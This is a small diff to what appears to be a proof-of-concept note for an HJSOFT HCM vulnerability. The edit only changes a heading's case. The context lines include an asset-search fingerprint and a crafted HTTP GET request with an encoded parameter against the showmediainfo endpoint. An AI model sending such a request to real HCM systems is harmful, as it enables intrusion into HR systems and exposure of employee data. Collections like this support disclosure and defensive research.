@@ -6,7 +6,7 @@
 app="HJSOFT-HCM"
 ```
 
-## poc
+## POC
 ```
 GET /workbench/duty/showmediainfo?kind=0&usernumber=1MV8sCtnMcsZFzLhJXUMPAATTP2HJFPAATTPVIRoUrFdir1XVNthrak35kPAATTP3HJDPAATTP&planid=1&objectid=1 HTTP/1.1
 Host: 
